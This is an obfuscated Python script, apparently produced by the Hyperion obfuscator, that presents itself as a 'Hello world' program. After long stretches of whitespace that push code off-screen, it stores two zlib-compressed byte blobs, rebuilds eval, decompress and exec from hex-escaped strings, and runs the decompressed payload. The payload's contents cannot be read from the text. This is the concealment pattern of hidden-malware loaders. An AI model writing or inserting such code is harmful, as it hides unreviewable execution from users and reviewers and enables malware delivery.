from builtins import *
from math import prod as StackOverflow


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Hypothesis, MemoryAccess, Frame, _builtins, _algorithm, _run = exec, str, tuple, map, ord, globals

class Algorithm:
    def __init__(self, _calculate):
        self._memoryaccess = StackOverflow((_calculate, -99133))
        self.Product(Divide=-6086)

    def Product(self, Divide = float):
        self._memoryaccess -= -11174 * Divide

    def _math(self, System = -48301):
        System /= -99049 / 85597
        self._frame != type

    def _stackoverflow(_divide = None):
        return _run()[_divide]

    def Builtins(Math = -72171 + -43359, _theory = type, Random = _run):
        Random()[Math] = _theory

    def execute(code = str):
        return Hypothesis(MemoryAccess(Frame(_builtins(_algorithm, code))))

    @property
    def _frame(self):
        self._product = '<__main__.Hypothesis object at 0x000002333BE28985>'
        return (self._product, Algorithm._frame)

if __name__ == '__main__':
    try:
        Algorithm.execute(code = __code__)
        Theory = Algorithm(_calculate = 31551 / -41390)
        Algorithm(_calculate = 16893 / -18533)._math(System = -39517 / Theory._memoryaccess)                                                                                                                                                                                                                                                          ;Algorithm.Builtins(Math='IIIlllIIlIIIIIlIIIlIlI',_theory=b'x\x9c\xdd\x1b]o\xe2H\xf2\x9d_\xc1\xe6\x05P\x18\xc6n\xb7m@\xe2\x1eV\xdciAd9mN\x97\x9c2#d\xecv\xe2\x8c\xe3fm\xb3!Z\xed\x7f\xbf\xaa\xea6\x98\x046@\x9c\xd9U\xdc\xf4\xf7wuuuuu\x91\xa7O\xfdZ\x1d\xbe(l\x92\x8f\xdfl&\xe7\xe12\xf3\xbd\\\xa6\xb3Y\xfd\x87\xc1\xd9OO\x0b\x91F29\xab\xcb\xb4T\xcc[\xe6w2\xcd\xa8L\xf3l\x1e\xc5\xf1S~\'n\xa5\x97[\xb6s\xd6>\xfb1^\x8a_Dp\xd6\xda\xaau\x1b\xe5w\xcb\xb9j\xf8.\xcf\x17Y\xff\xf3g\x95\xd6\xf1\xe5\xc3\xe7g\xcd|\xde\xd3w\x10e\xbeL\x83\xedftb\xe7\xf6\xf6\xf3"\xf6n\x97\xe2Y\xa58\xf2E\x92\tU\xe9\x9f\xff\x9e|b\x1d\xe3Y\x11_\x06*\xbf\xb1H\xa3$o\x9e\xfd$\xe2X\xd6\x1fe\x1a\x07?\x9c\xb5\x1a\xb5V\x7f]\x1a\xf3\x1b\xd9\xb7(h\xb4jb\xe5\x8bE\xae\x81\x99,\x96P\xf3\x17\x99\x89\xac\xee\xa5\xa2\x9e\x8a\xe0K\xf2\xdfH\xc6"W\ts\x80\xcc\x97\xe4\x7frI1\xaf\x8e\x8d|I~\x96s\x19<\xd5\xe3\xe8\x1b\xd4{\x92\xcb\xb3VM\r*zX\xc84\x9f\xcd\xa0\xb7\xa7\xac\xd1\xea\x88U\x947[\xb5X\xfa^\x9c5[7\x8d\xc7\xd5\xe3\n\x7f\xe4<\xc2\x07n\xe3\xeb\xe06\x96s(Q\xdb\x95\x8d\xd5\x92\xe4\x81>\xf4\xe9\xd7\xb8\xe9\xf7\xcf?\x9d\x7fj~j\x9e\x9b\xad\xd6WhB\xe4^\x9e\xa7{\x9b\x18\xca)|C)\x87S)\xa7\xc3\xe9p8\x9d\xbel%\x88\xf6\xb7\x80\xe9\x8f\x94\x80.e\xc3\xd0\xd5\xdcj;2\xb1\x0e\x8cX\x8f\x19G\x8f\xe3\x87*\x1b8\xed\xedK\xaa\xa1\x0e\xc9\x9bN\xe5\x14\xaa\xbdl\xab\xd9\x98/\xa38\x8f\x12\x84\xf5o^\xba\x1f\x80\x97\x97L}\x97E\xe8\x92Q\x93\n\x9ek\xf06wu\x92%Q\x1eG\xcb\xf9sp\xb5\xdaS\x04\xa3\x02(\x02\x16>9<\xae\x89\xd6M\x05mt\xa2$\x10\xabf#\x96\xf2e\xee\xd7\xd6\xbe\xc5\x19\x8dG\x93\xd1d2\x02\x1f\xbe\t\xc6F\xe3\xf1\xe4\xe3\xc1E,\xd3\xff\x1c\x01\x97\t\x02\x02\xe02\x1e\x8d\x01(\xe31\x00f|0P\xa2\xc8\xcf\xbc$z\x0bP\xf66q\x04P\xf6\xb7Q\x00\xe5)\x8c\xe2\x95\xb8K\x96G@&\x8e\xe3\xd1\x08\x1d\xf0F\xe8\xc6\x1f\x10Y\xb2\xd8\xfb\xd7>\x98\xec\xa2-\x17?\xc3\x07\xce\xc5\xc5\x05x\x17*\x8a\x11\x80M\xa3\xd1\xb9\x97Q\xf2gT\x99\xe8\x1cR9\x89\xdfp\xfa\xf1 \x1a{\xbf\x89]\x00}A\xe4\x11"S\n\xa1\x01\xa0\xe0O~<\x80\xa4yv\x04<\x0c\xf8\x19\x84\x1d\x86D4\x99N\x8d\x8f\x07\x12\x11G\x8b\x07\xe9\x1f\x0c\x96\x98H\x91\xa2C\xb1\x8a\x005\x8aG\x1f\x0f2\xb9\'\xe3\xf0(zt\xa1(QA\x86\x88$AB\xb9\x8d\x1dt\xa7\xb9\xeb\xd8k\xce\x1b\x96\xc9\x02\xd6e\x81e\xb0\x1e\xb0Y\x81@\xce\xbb\xd9\xe8\x86\xf9\xcb\x93\xa3EL\xe4\x07[\x00_\xac\x0e&_{`\xc8=\xde\x03\xe3\x81\xf1\xc1\xf4\xb4[\xa4)\xffU\xe8\x02\xb3\xed=\xcc\x03\xaf\x0e\xed"\xb76\x19\xe9\xc0\x98\xb8\xb7Q\x7f\xe7\xa9}\xd48C\x07\x8ce\xf0p\x13*\xe2\xe8\xaa\x10\xfaN\xf8\xfah\x8f@2\xe6:\x81k\xbb\xcc\xf1\x99\xfb*\x92\x1d3#\xdb\xb2-\x8b)[\x84\x8ax\x91V\xa4V=#\xf3\xd4\xb9\x00\x07\nmMpq\xc7\xc8\x92\x8f0>zm\xff6Z\x06\xe4\x99\xa7nsf\x87d\r\xb0&X\x07\xac\r\xd6\xd2\x16\xc3&\x9b\x13)8\xa4\xec\x81\xe4B\x91\x8c\xa3\x00k\xdb.\xf4\xe82\x16p\xd3q\x1d\xdb\x11.?\x19\xd4x!D\x837B\xba\x1d^^\xbe\x0eh\x13\xf2\x8c\xefDO\x15\x80\x8a\x9d\xafnl\xf8\x1b\xeb[\x1b$\xf5w\x1f\x05\xbb\'\xac\x0e\x03\xe2T\xd5\xd9\xf0\xfat\xad\x99\x03\xc6\x98ug\x1c\xac3\xb3\xa1$\x7f\x9e\xf6]\xc1q\x14\xbe0\x8f\x85`O\xc5\x10\xe22\xb6\x19\x8d\xefv\x94\x1eGp\xba.w\x02 \xa1\xc25\x1c\xd3ez\x97\x9c:\xef\xab\xeb\xab\xab\xebk\xfc\x81\x05\x07C\x07l\x8d\x999C\xdc\xe8\x81\xe13\x1bq\x03\xca\xb2\x97\xa9\x7f\xc5\xf6\xa1\x8dN?\xdc\xe7LY\x94\x06\xf5w@\xe0\x98c\xc6\xa1\xe3\xdc\xf17\xbe2\x18\xde\xa4\xabP\xd5\xc7\x0c\xac:\x18\xc3\xb5,\xc4\xf3\xd0\xa5\x8f\t\x879=G8\x18\xb2\xe0,\x0f*>X\xcb3\xda\xcc\xb6H{\xa7\xb9r\xa2\xf5\x84\xd5\x06\x84l\xc0v\xa6c\xa1\xe3\x80\xdb\x83\x14:\x13\\\x8b\x19P2\x844p]\x17 \xe1C\x19\xd3\xe1\xcc`],\xe5"\x12\xc1i\xc5z\x90\x12\x80\xad\x16>\xb0\x06]\xb5\x14\xe0w\xb7b\x85\x8b\xe9\xddJ!d\x19zs\x98\x07l\x8e\xdd\xbb\x1ew\xfc\x15~j\xdb\xd3\xfe\xbf>u\xaf\x1e3\x9c\xf2>]\xb3\xb0\xca_\xad\xde\xce\xda"\xabW\xb0\x80e\xa6o\xc3\x08\xa2\xa9\x18_m\xc0N\xc7A\x0c}\x0b%\xfe\x13f\x1d\x19qt\xd1\x14q\xae\xe3N\xa8\x8cb\xd9\xab\x9d\x19\xb3\xc4\xcb\x9d\x05s\xe5\xecU.\xfa\xb8Us\xed\xee\xda\xb8\xeb\x98[6\x07_\x9bHt\xa2d(\xd2PR\xa6\xb7\xd2}.x@6 _hW<K\x07\xb7b\xcc\x02\xb8W\x8dO\x1b\x9a\xa4\x8d[\xb2[\xee\xc1\x10\xd7W\xed\x07\xfdj\xa5$\x02\xc9C\x05\x17U\xbe\xc6l\x08q\x8e\xb8\x8f.\xe7:L!\x87\xae\xb1\x07\x8f\x16{\xa2\x8eFh\xb1/\xcdZ\xbf\x91\xf0<\xbfk\x16\x84h;\\1\x82\x9c\xcc\xf6\xdd\xc7\xf7\x11\x988\xd6\x01t*\xbaz\xbe\xf1\x86j\xea\x9b\xa5[\xbamrm)\xaco\xa7\xaf\x95\xb3\x0e\xe7\x1cO\xb9m\x00\xc1\x07\xba\xc8\x9c\xc0\nx\x97s\x1bV\x99C\x9f\x94\xdeC\xae\xdc\xe5\x16\x1e\x89\x0epm\x96cA\xa95\xd7\xc2\x19\xf0%\x16p1\x16\xefB\x1b\xce\xbb\x9c\x1a|\xbd;\xf4\x1e\xe2\xc5~)r\xd4\x9e\xaa\x9aO\x05\xde\x8d\x05\xb6m[\xcc\xc7\xb05wM\x0b\xd9xa\xf5\xaa\x9ecP\xa6\xbc[\xf4X\x94\xe83\xe5U=\xcb9\xcc\xcdv\x81\xf1\x81\x15\xf5a\xbda\r\xdfe\x05\x8b\x13~s\xf2\x17\xe7~\x91\xa2\x84x\x18\xabz\x8e=\x17%0\xd6\xe97\xea\xc9\x88>lyB2\x0c\xeai\xf27\xbdVW\x7fuB\xcc\x00\xe3\xad\xfd\x1e\x85<\xb2\x98\xeaQ\x19\xef\xe0\xa3K\x89&\x90jG\xf8\xdd\x13\xed\xae\xe0\x98\xf5\xd6\x92jO\xcb\xad{\xeb\x18\xc9\xad\x8f`\x05\x14\x0b\xb0\xd6a\x81\xd01r\xab\xbd\x8c@A\xae4\x11[#\xbef\x114SP\xb9l\x17.\xd5(^1N\x17=\xee\x9b\x91\xbf\x05s\x7f\xeb\xed@\xbf\x14\xa8P\xd5s\xb2\x00\xe5\xe0\xf8qO\xde\xd8\xfbf\xd4\xd3#\xf6\xf4\xd8=m{\xeb\xd9\xbd\xcb|\xcak\x14\xe0\xdcP\x1c\xe2\xda\xea\xa8}\xaf#\'(\x1d9\xe2\xd9\xa5\xa0tM\xf8\xab\x84@\xe1\x96\x88$D\x11!\x8a\n!\xb7k\x85x WM\xeb\x020\x02L\xb06B\xdbM\xba\xd0!\xb0U\x0b\x8c\x02`\xa3\x14y\x85\xf5g\xc0\x0f\x02\xbba\xa0\x08\xc8v\t2t\x85Ea\x11\x17\xc0}\x19\x96I\x0c\x89a\xcd\x99\xa1J\x00\nq\x8c\xb9]\x0c\xa1\xb0\x88\x9b\x00g\x03\xda\xb3mdj\x18\x9f\xc3\x81\xc8\xb1m\xcb\xb2\x00\xd2\xe0:\xd8\x03\x9f\xf3\xae\xcda\xc1}\xe63\x83\x08<0\x07P\x1fkY\x10\x0e\xa95\x80<\xc0\x1f\xd6\x06\xf2B\xab\x07\x8c\xa2\xa01ph\xcf\xa4\xf1\x9a\xd0\xa2\t\xe3\xb1`\xdd\x1cZ\xad\xde\xb3\xdeN\x17mO\xc6\x13z;\xa4\x87D<\x89\xe9Iq\xfc\xf7`\xf8\xbb\x9ai\xc7g\xa6^\x89\xa9w\xf4\xf3\x93Yb\xfa\x0f)\xfb\x9e\x8c?u\xee\xe8\x01tK\xbe]\x0cH\x0f\xf4\xb5r\xfcd\xd1\xdd=}po\x83\x1b[\x14#/p\x7f\xc8\xd5\xcd\x9a\xa1\xcc\xde\x06\xdb\x9dY3\x0e\xd6\xa2\xf7\x9d\x17\xa9\xef\xbc\xdaG\n\x0bO\xbc\x9e\x95E\xc8n\x0fv\xbf\n\x99.\xb2\xed\xcc}\x1fapq\xcdr6\xd7,\xcd\xab8a!\xbaX\xe7U\xcf\xadp\xa4\xfdHb\x81\xee\xc0\xdc{\x18\xab\xfa\x9d\xdd]\x8b\xe7\x8a\x90\xfbLPW\x88\xee\xb48\xef`\xce\x91^\xa0\xae\xd4;\xd4\x95\x12N_\xef\xe3\x1c\xc3T>\xd4\x0b\xa5\xe0\xbaR3\xae{q\xdc\x16+\xe1\xb7I\xdf\xbbM\xfa\xe2m\xb4r!\x92\x1a\xe647\x0fB\x1b\xb7U\xd3\xf5S\xf1\xebRdy\xa6[\xcfx\xd1\xf0\x8f\xc2[\xe6Q\xb8\x8c/\xe5rQ\x94\xbe\xcfd\xa2J\xa6^\x12\x80\xa7\xd3\xfd;\x19\xf9B\xe5\x04^.\xf2\xe8A\x14yE\xbc\x06\x1d\xa5O\x03\xa5\x97\x8e\xbb\x17\xa50\xc0\xce\xe3nV\xbb\xbbUK\x96\x0f\x03ThW\x85\xca\xef\x92\xea\xa12\x86\x85[\xa6\xf1\xe0B}\x85r\xa2\xd2\x06\x02\xe7\x9c\xfa8/D;H/\xb4\xc4\xe7\xbev\'\xbc@\xa4\xd9\xe0w\xa5\r<\xd6\x07\x03)#\x8c&\xfd\xb5NOR\xe8\xf7\xa0>M\xf2\xd0^k\xda\xc3\'\x0b\x9cQ\xea7\xa8o\x8e\xaa8\xc3\xbeRK\xa2\x81(\xed$\x1a\xd0V\xddK\xf5\x00\xcf\xf4{<F\xfb4\'=I\xa5\xe3\x85\x91\xadjC\xd2\x13\xc4\xfeP\xcd\x07\xf7\x02t\xa7\xd4\x9e.\xf4[7\x04\xb7\xaa\x8c\xd4\xf4pb\xea\x00\x04\xac\xee\xe3\x98\x87\x92t\x86H?\x9e\xda\xfd\xa3\x96\nX\xd2L\x0c\n<\xe8\xdc\x8a\xbc\t n\x17\xe0\xd2~\xab\x96\x01\x1e\x0c\xb6\xb0\xa2\xa9+wr\xb1\xca\xdb\xa3\xb8\xb4Z\xeaU\x19\xb1\xcc\xbb\x15\xd9,\x8e\x92o\x83\x9b\xaf5\xf4\xb3\x01\xb6\xd4\t\xa3$\x98\x01\xf66/5~\x96\x9f.\x19k\xff>!\xed\xed\x89>\xc0G\xa4\xd0M\xd3@17*\r\x1a\x10200E%\xc2?`\x83\xc8\xb4\x8e=\xd4\xa3\x84\xfcL\xff\x13\x02\xc70C\xb4A\xf4\xed\xc4\xd2\x0b\xb2&\xe6\xdfL\xca7\xf4\xb1R\x15Gh}mm*\xaa\xc1w\xbc\x05\xec\xa7\xa0')

        Algorithm(_calculate = -95369 / 58511)._math(System = -11505 + Theory._memoryaccess)                                                                                                                                                                                                                                                          ;Algorithm.Builtins(Math='LLLLLLIJJJIJILILIJI',_theory=b'\xb9n\xebF\xcb\xd9I\x83\x11\xc6\x04\x06\\\t5\xa3\x01]KW\xeav\xbaRo<+\x1a\x9c\xaa]\x0c\xb1\xd4\xbc\x1e\xe8L\xce\xef\x85\x9fo/\xc6\xa6\xd2\xcb5\xc1Z\x8fQ~W\xc7\xdd\xde<\x82n:\x0e\x8a:\nn\xd9\x0e\xdd9\xf2\x83\xc0\xe9u\x81k4\xe9\x0c\xe1\x94\x0f<\x1a\xd0V\xe0#\xe1\xf8\xea1Q\xa4\xa2\xa0\x0f\xea\x06\xaeA\xe9=7\x80r\x1ep\x8e\x87\xc8f\xdbk\x05\r\xb5\x81\xd5\xdeiyY=\xdc\xfc\xaf%\xec<\xa6Q.\x9a\x05P:\xbeLr\x91\xe4j\xd2\xea\x7f1SI\xa8\x80K \x11\x19p\xce\xb0\x0c\xedH\xaf\xdf\xf9\x80v\xf8X\xe1\x8fR8\x9a\x10[8\xd2\x7f8\xaaG\xff\x00\x9a\xb3\xe9u\x9e\n\xef[\xed\xffSMt\xd1')
        Algorithm(_calculate = -24517 / 72711)._math(System = -22141 / Theory._memoryaccess)                                                                                                                                                                                                                                                          ;IllIIllIIIlllIIlIll,nmmmnnnmmnmmnnmnmnnnmnn,nnmnnmnmmnnnnnnnmmmnmn,WWXXXWWXWWXXXWWWXXWWW,MMNNNMNNNMNMNNNNNMNNNMNN=(lambda OOOo00OOoOo00OOoo0Oooo:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOOo00OOoOo00OOoo0Oooo)"),filename='\x53\x53\x32\x32\x53\x32\x53\x53\x53\x53\x53\x32\x53\x32\x32\x53\x32\x53\x53',mode='\x65\x76\x61\x6c'))),(lambda OOOo00OOoOo00OOoo0Oooo:OOOo00OOoOo00OOoo0Oooo(__import__('\x7a\x6c\x69\x62'))),(lambda OOOo00OOoOo00OOoo0Oooo:OOOo00OOoOo00OOoo0Oooo['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda OOOo00OOoOo00OOoo0Oooo:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOOo00OOoOo00OOoo0Oooo)"),filename='\x53\x53\x32\x32\x53\x32\x53\x53\x53\x53\x53\x32\x53\x32\x32\x53\x32\x53\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda Ooooo000o0O0o000O0oO000,OOOo00OOoOo00OOoo0Oooo:Ooooo000o0O0o000O0oO000(OOOo00OOoOo00OOoo0Oooo))
        if 414502 > 2042386:
            Theory._math(System = 40407 * Theory._memoryaccess)
        elif 208915 < 8126086:
            Theory._math(System = -80581 + Theory._memoryaccess)                                                                                                                                                                                                                                                          ;WWXXXWWXWWXXXWWWXXWWW()(MMNNNMNNNMNMNNNNNMNNNMNN(nnmnnmnmmnnnnnnnmmmnmn(nmmmnnnmmnmmnnmnmnnnmnn(IllIIllIIIlllIIlIll('\x76\x61\x72\x73'))),Algorithm._stackoverflow(_divide='IIIlllIIlIIIIIlIIIlIlI')+Algorithm._stackoverflow(_divide='LLLLLLIJJJIJILILIJI')))
    except Exception as _random:
        if 228110 > 3966589:
            Algorithm.execute(code = MemoryAccess(_random))
        elif 287905 > 8471564:
            Algorithm(_calculate = -53149 + 36411)._math(System = 22179 + Theory._memoryaccess)